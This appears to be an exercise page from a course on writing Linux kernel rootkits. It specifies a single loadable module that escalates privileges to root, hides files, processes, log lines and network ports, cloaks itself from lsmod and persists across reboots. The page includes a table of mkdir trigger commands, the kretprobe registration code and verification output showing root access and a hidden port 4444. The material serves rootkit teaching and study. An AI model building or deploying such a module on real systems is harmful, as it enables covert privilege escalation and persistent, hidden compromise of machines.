# One .ko with full local rootkit control

This milestone assembles everything from the concealment stage into a single
kernel module. Five kretprobes, four target lists, credential escalation, PID
escalation, module cloaking, persistence, and 16 mkdir commands. One .ko that
does it all.

## What you are building

A single `main.c` that integrates:

- **Command dispatcher** (mkdir kretprobe): routes all 16 commands
- **Dirent filter** (getdents64 kretprobe): hides files and PIDs
- **Content filter** (read kretprobe): removes matching lines from reads
- **Port filter** (tcp4_seq_show and tcp6_seq_show kretprobes): hides ports
- **Credential escalation**: prepare_kernel_cred + commit_creds
- **PID escalation**: deferred delivery via /proc/rklings
- **Module cloaking**: list_del from module list
- **Persistence**: write to /etc/modules-load.d/

## The 16 mkdir commands

```
rklings.e           - escalate to root
rklings.p.<pid>     - escalate target PID (deferred via proc)
rklings.cloak       - hide module from lsmod
rklings.uncloak     - restore module visibility
rklings.persist     - write persistence file
rklings.unpersist   - remove persistence file
rklings.h.f.<name>  - hide file name from ls
rklings.u.f.<idx>   - unhide file by index
rklings.h.i.<pid>   - hide PID from ps
rklings.u.i.<idx>   - unhide PID by index
rklings.h.c.<str>   - hide lines containing string
rklings.u.c.<idx>   - unhide content by index
rklings.h.p.<port>  - hide port from ss
rklings.u.p.<idx>   - unhide port by index
```

## The rollback chain

The critical engineering challenge is the `__init` function. You register five
kretprobes and a proc entry. Each registration can fail. If probe 4 fails,
you must unregister probes 1 through 3. If probe 5 fails, unregister 1
through 4. This is a classic goto rollback:

```c
ret = register_kretprobe(&mkdir_probe);
if (ret) return ret;

ret = register_kretprobe(&getdents_probe);
if (ret) goto fail_getdents;

ret = register_kretprobe(&read_probe);
if (ret) goto fail_read;

ret = register_kretprobe(&tcp4_probe);
if (ret) goto fail_tcp4;

ret = register_kretprobe(&tcp6_probe);
if (ret) goto fail_tcp6;

return 0;

fail_tcp6:
    unregister_kretprobe(&tcp4_probe);
fail_tcp4:
    unregister_kretprobe(&read_probe);
fail_read:
    unregister_kretprobe(&getdents_probe);
fail_getdents:
    unregister_kretprobe(&mkdir_probe);
    return ret;
```

The `__exit` function unregisters everything in reverse order. No exceptions.

## Your task

The starter gives you all the target list code, the filter logic, and the
command dispatcher skeleton. You fill in:

1. The complete `__init` with goto rollback for all five probes
2. The complete `__exit` in reverse order
3. Wire the command dispatcher to handle all 16 commands

## Verify

Load the module, then test each capability:

```sh
$ mkdir rklings.e && id
uid=0(root)
$ mkdir rklings.h.f.secret && ls
(secret hidden)
$ mkdir rklings.h.p.4444 && ss -tlnp | grep 4444
(port hidden)
$ mkdir rklings.cloak && lsmod | grep rklings
(module hidden)
$ rmmod rklings
```
